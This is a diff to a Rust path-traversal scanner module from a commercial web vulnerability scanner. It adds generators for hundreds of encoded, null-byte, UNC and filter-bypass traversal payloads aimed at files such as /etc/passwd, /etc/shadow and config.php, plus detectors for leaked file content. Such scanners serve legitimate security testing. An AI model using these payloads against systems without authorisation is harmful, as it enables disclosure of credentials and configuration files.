@@ -3,7 +3,7 @@
 
 /**
  * Bountyy Oy - Enterprise Path Traversal Scanner
- * TRULY Advanced LFI/Path Traversal detection with 2000+ generated payloads
+ * TRULY Advanced LFI/Path Traversal detection with 3000+ generated payloads
  *
  * Features:
  * - Programmatic payload generation (like SecLists LFI-Jhaddix.txt)
@@ -11,16 +11,21 @@
  * - 1-15 levels of directory traversal
  * - URL encoding, double encoding, triple encoding
  * - Unicode variations (%c0%ae, %u002e, fullwidth)
+ * - UTF-8 overlong encoding (%e0%80%ae, %c0%af, %c1%9c)
  * - Null byte injection with all extensions
  * - Both Linux and Windows targets
  * - PHP wrappers (php://filter, data://, expect://)
- * - Filter bypass patterns (....// , ..;/ , etc.)
+ * - Filter bypass patterns (....// , ..;/ , ..././ , etc.)
+ * - Platform-specific attacks (UNC paths, case insensitivity)
+ * - Advanced path manipulation (mixed slashes, space/tab injection)
+ * - Enhanced detection for hosts files, config files, and sensitive data
  *
  * @copyright 2025 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
 
 use crate::http_client::HttpClient;
+use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -83,7 +88,15 @@ impl PathTraversalScanner {
         parameter: &str,
         _config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        info!("[PathTraversal] Enterprise scanner - testing parameter: {}", parameter);
+        // Smart parameter filtering - path traversal needs file/path parameters
+        if ParameterFilter::should_skip_parameter(parameter, ScannerType::PathTraversal) {
+            debug!("[PathTraversal] Skipping non-file/path parameter: {}", parameter);
+            return Ok((Vec::new(), 0));
+        }
+
+        info!("[PathTraversal] Enterprise scanner - testing parameter: {} (priority: {})",
+              parameter,
+              ParameterFilter::get_parameter_priority(parameter));
 
         let payloads = if crate::license::is_feature_available("enterprise_path_traversal") {
             self.generate_enterprise_payloads()
@@ -351,6 +364,350 @@ impl PathTraversalScanner {
         ]
     }
 
+    /// Generate advanced URL encoding bypass payloads
+    fn generate_url_encoding_bypasses(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+        let target_file = "etc/passwd";
+
+        // Basic unencoded
+        payloads.push(TraversalPayload {
+            payload: format!("../../../{}", target_file),
+            category: TraversalBypassCategory::StandardTraversal,
+            target_file: target_file.to_string(),
+        });
+
+        // Single URL encode - full path
+        payloads.push(TraversalPayload {
+            payload: format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}",
+                target_file.chars().map(|c| format!("%{:02x}", c as u8)).collect::<String>()),
+            category: TraversalBypassCategory::UrlEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Single encode - just slashes
+        payloads.push(TraversalPayload {
+            payload: format!("..%2f..%2f..%2f{}", target_file),
+            category: TraversalBypassCategory::UrlEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Single encode - dots and slashes
+        payloads.push(TraversalPayload {
+            payload: format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}", target_file),
+            category: TraversalBypassCategory::UrlEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Double URL encode
+        payloads.push(TraversalPayload {
+            payload: format!("..%252f..%252f..%252f{}%252f",
+                target_file.split('/').collect::<Vec<_>>().join("%252f")),
+            category: TraversalBypassCategory::DoubleEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Double encode - full path
+        payloads.push(TraversalPayload {
+            payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd".to_string(),
+            category: TraversalBypassCategory::DoubleEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Unicode/UTF-8 overlong encoding - %c0%af is overlong /
+        payloads.push(TraversalPayload {
+            payload: "..%c0%af..%c0%af..%c0%afetc/passwd".to_string(),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Alternative Unicode - %c1%9c
+        payloads.push(TraversalPayload {
+            payload: "..%c1%9c..%c1%9c..%c1%9cetc/passwd".to_string(),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // UTF-8 overlong dots - %c0%ae is overlong .
+        payloads.push(TraversalPayload {
+            payload: "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd".to_string(),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Mixed encodings
+        payloads.push(TraversalPayload {
+            payload: "..%2f%2e%2e%2f%252e%252e/etc/passwd".to_string(),
+            category: TraversalBypassCategory::UrlEncoding,
+            target_file: target_file.to_string(),
+        });
+
+        // Test for Windows
+        let win_file = "windows/system32/drivers/etc/hosts";
+
+        payloads.push(TraversalPayload {
+            payload: format!("..%2f..%2f..%2f{}", win_file),
+            category: TraversalBypassCategory::UrlEncoding,
+            target_file: win_file.to_string(),
+        });
+
+        payloads.push(TraversalPayload {
+            payload: format!("..%255c..%255c..%255c{}", win_file.replace("/", "%255c")),
+            category: TraversalBypassCategory::DoubleEncoding,
+            target_file: win_file.to_string(),
+        });
+
+        payloads
+    }
+
+    /// Generate platform-specific bypass payloads
+    fn generate_platform_specific_bypasses(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+
+        // Windows-specific attacks
+        let win_targets = vec![
+            ("windows/system32/drivers/etc/hosts", "hosts"),
+            ("windows/win.ini", "win.ini"),
+            ("windows/system.ini", "system.ini"),
+        ];
+
+        for (target, _name) in &win_targets {
+            // Standard backslash traversal
+            payloads.push(TraversalPayload {
+                payload: format!("..\\..\\..\\{}", target.replace("/", "\\")),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: target.to_string(),
+            });
+
+            // UNC path with \\?\ prefix
+            payloads.push(TraversalPayload {
+                payload: format!("\\\\?\\C:\\{}", target.replace("/", "\\")),
+                category: TraversalBypassCategory::UncPath,
+                target_file: target.to_string(),
+            });
+
+            // UNC path alternative
+            payloads.push(TraversalPayload {
+                payload: format!("\\\\?\\UNC\\localhost\\C$\\{}", target.replace("/", "\\")),
+                category: TraversalBypassCategory::UncPath,
+                target_file: target.to_string(),
+            });
+
+            // Mixed slashes
+            payloads.push(TraversalPayload {
+                payload: format!("../../../{}\\system32/drivers\\etc\\hosts",
+                    if target.contains("windows") { "windows" } else { "winnt" }),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: "windows/system32/drivers/etc/hosts".to_string(),
+            });
+
+            // Case insensitivity exploitation
+            payloads.push(TraversalPayload {
+                payload: "..\\..\\WiNdOwS\\SyStEm32\\DrIvErS\\eTc\\HoStS".to_string(),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: "windows/system32/drivers/etc/hosts".to_string(),
+            });
+
+            payloads.push(TraversalPayload {
+                payload: "..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts".to_string(),
+                category: TraversalBypassCategory::WindowsSpecific,
+                target_file: "windows/system32/drivers/etc/hosts".to_string(),
+            });
+
+            // URL encoded backslashes
+            payloads.push(TraversalPayload {
+                payload: "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts".to_string(),
+                category: TraversalBypassCategory::UrlEncoding,
+                target_file: "windows/system32/drivers/etc/hosts".to_string(),
+            });
+        }
+
+        // Linux-specific with absolute paths
+        payloads.push(TraversalPayload {
+            payload: "/etc/passwd".to_string(),
+            category: TraversalBypassCategory::LinuxSpecific,
+            target_file: "etc/passwd".to_string(),
+        });
+
+        payloads.push(TraversalPayload {
+            payload: "/etc/shadow".to_string(),
+            category: TraversalBypassCategory::LinuxSpecific,
+            target_file: "etc/shadow".to_string(),
+        });
+
+        payloads
+    }
+
+    /// Generate null byte injection payloads
+    fn generate_null_byte_injection_payloads(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+        let extensions = vec!["jpg", "png", "gif", "txt", "pdf", "html", "php"];
+        let targets = vec![
+            ("../../../../etc/passwd", "etc/passwd"),
+            ("../../../../etc/shadow", "etc/shadow"),
+            ("../../../../var/www/html/config.php", "var/www/html/config.php"),
+        ];
+
+        for (path, target) in &targets {
+            // Standard null byte
+            payloads.push(TraversalPayload {
+                payload: format!("{}%00", path),
+                category: TraversalBypassCategory::NullByte,
+                target_file: target.to_string(),
+            });
+
+            // Null byte with extension
+            for ext in &extensions {
+                payloads.push(TraversalPayload {
+                    payload: format!("{}%00.{}", path, ext),
+                    category: TraversalBypassCategory::NullByte,
+                    target_file: target.to_string(),
+                });
+            }
+
+            // Literal \x00
+            payloads.push(TraversalPayload {
+                payload: format!("{}\x00.jpg", path),
+                category: TraversalBypassCategory::NullByte,
+                target_file: target.to_string(),
+            });
+
+            // Double encoded null byte
+            payloads.push(TraversalPayload {
+                payload: format!("{}%2500.jpg", path),
+                category: TraversalBypassCategory::NullByte,
+                target_file: target.to_string(),
+            });
+
+            // Null byte in middle
+            payloads.push(TraversalPayload {
+                payload: format!("{}/../..%00/etc/passwd", path),
+                category: TraversalBypassCategory::NullByte,
+                target_file: "etc/passwd".to_string(),
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate advanced path manipulation payloads
+    fn generate_advanced_path_manipulation(&self) -> Vec<TraversalPayload> {
+        let mut payloads = Vec::new();
+        let target = "etc/passwd";
+
+        // Dot segments - ....// gets normalized to ../ after filter removal
+        payloads.push(TraversalPayload {
+            payload: format!("....//....//....//....//....//....//....//....//....//....//....//.....//{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Alternative dot segment pattern
+        payloads.push(TraversalPayload {
+            payload: format!("....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd"),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Overlong traversal sequences
+        payloads.push(TraversalPayload {
+            payload: format!("..././..././..././..././..././..././..././..././..././..././..././..././{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Backslash normalization bypass
+        payloads.push(TraversalPayload {
+            payload: format!("..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // UTF-8 overlong encoding for ../ - %e0%80%ae is overlong .
+        payloads.push(TraversalPayload {
+            payload: format!("%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/{}", target),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target.to_string(),
+        });
+
+        // Overlong UTF-8 slash
+        payloads.push(TraversalPayload {
+            payload: "..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd".to_string(),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target.to_string(),
+        });
+
+        // Mixed overlong sequences
+        payloads.push(TraversalPayload {
+            payload: "%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%afetc/passwd".to_string(),
+            category: TraversalBypassCategory::UnicodeEncoding,
+            target_file: target.to_string(),
+        });
+
+        // Semicolon bypass (Tomcat)
+        payloads.push(TraversalPayload {
+            payload: format!("..;/..;/..;/..;/..;/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Space injection
+        payloads.push(TraversalPayload {
+            payload: format!("..%20/..%20/..%20/..%20/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Tab injection
+        payloads.push(TraversalPayload {
+            payload: format!("..%09/..%09/..%09/..%09/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Newline/CR injection
+        payloads.push(TraversalPayload {
+            payload: format!("..%0d/..%0d/..%0d/..%0d/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        payloads.push(TraversalPayload {
+            payload: format!("..%0a/..%0a/..%0a/..%0a/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Windows-specific advanced
+        payloads.push(TraversalPayload {
+            payload: "....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts".to_string(),
+            category: TraversalBypassCategory::WindowsSpecific,
+            target_file: "windows/system32/drivers/etc/hosts".to_string(),
+        });
+
+        // Triple dot
+        payloads.push(TraversalPayload {
+            payload: format!(".../.../.../.../{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Forward-backward slash mix
+        payloads.push(TraversalPayload {
+            payload: format!("../\\../\\../\\../\\{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        // Backward-forward slash mix
+        payloads.push(TraversalPayload {
+            payload: format!("..\\/../\\/../\\/{}", target),
+            category: TraversalBypassCategory::FilterBypass,
+            target_file: target.to_string(),
+        });
+
+        payloads
+    }
+
     /// Generate PHP wrapper payloads
     fn generate_php_wrapper_payloads(&self) -> Vec<TraversalPayload> {
         let mut payloads = Vec::new();
@@ -523,6 +880,12 @@ impl PathTraversalScanner {
         // PHP wrappers
         payloads.extend(self.generate_php_wrapper_payloads());
 
+        // Add advanced bypass techniques
+        payloads.extend(self.generate_url_encoding_bypasses());
+        payloads.extend(self.generate_platform_specific_bypasses());
+        payloads.extend(self.generate_null_byte_injection_payloads());
+        payloads.extend(self.generate_advanced_path_manipulation());
+
         info!("[PathTraversal] Generated {} enterprise payloads", payloads.len());
         payloads
     }
@@ -608,7 +971,7 @@ impl PathTraversalScanner {
             ("nameserver", "resolv.conf"),
         ];
 
-        // Windows indicators
+        // Windows indicators - enhanced detection
         let windows_indicators = [
             ("[extensions]", "win.ini"),
             ("[fonts]", "win.ini"),
@@ -616,6 +979,9 @@ impl PathTraversalScanner {
             ("for 16-bit app support", "win.ini"),
             ("[boot loader]", "boot.ini"),
             ("[drivers]", "system.ini"),
+            ("127.0.0.1", "hosts file"),
+            ("::1", "hosts file (IPv6)"),
+            ("localhost", "hosts file"),
         ];
 
         // Process indicators
@@ -625,6 +991,50 @@ impl PathTraversalScanner {
             ("home=", "environ"),
             ("linux version", "proc/version"),
         ];
+
+        // Config file indicators
+        let config_indicators = [
+            ("<?php", "PHP file"),
+            ("<?=", "PHP file"),
+            ("define(", "config file"),
+            ("db_password", "config file"),
+            ("database", "config file"),
+            ("connectionstring", "config file"),
+        ];
+
+        // Check for specific file patterns based on target
+        let target_lower = payload.target_file.to_lowercase();
+
+        // Enhanced hosts file detection
+        if target_lower.contains("hosts") && !target_lower.contains("hostname") {
+            // Check for IPv4 pattern (127.0.0.1 or other IPs followed by hostname)
+            if body.contains("127.0.0.1") ||
+               (body.contains("::1") && body_lower.contains("localhost")) ||
+               body.matches(|c: char| c == '.').count() >= 3 {
+                // Additional validation - check for typical hosts file format
+                let lines: Vec<&str> = body.lines().collect();
+                for line in lines {
+                    let trimmed = line.trim();
+                    // Skip comments
+                    if trimmed.starts_with('#') || trimmed.is_empty() {
+                        continue;
+                    }
+                    // Check if line matches IP + hostname pattern
+                    let parts: Vec<&str> = trimmed.split_whitespace().collect();
+                    if parts.len() >= 2 {
+                        // First part should look like an IP
+                        let first = parts[0];
+                        if first.contains('.') || first.contains(':') {
+                            return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
+                                &format!("Windows hosts file content found via {}", payload.category.as_str()),
+                                Confidence::High,
+                                format!("Detected hosts file format: {}", trimmed.chars().take(100).collect::<String>()),
+                                &payload.category));
+                        }
+                    }
+                }
+            }
+        }
 
         for (indicator, file_type) in &linux_indicators {
             if body_lower.contains(indicator) {
@@ -643,6 +1053,14 @@ impl PathTraversalScanner {
         }
 
         for (indicator, file_type) in &proc_indicators {
+            if body_lower.contains(indicator) {
+                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
+                    &format!("{} content found via {}", file_type, payload.category.as_str()),
+                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+            }
+        }
+
+        for (indicator, file_type) in &config_indicators {
             if body_lower.contains(indicator) {
                 return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
                     &format!("{} content found via {}", file_type, payload.category.as_str()),
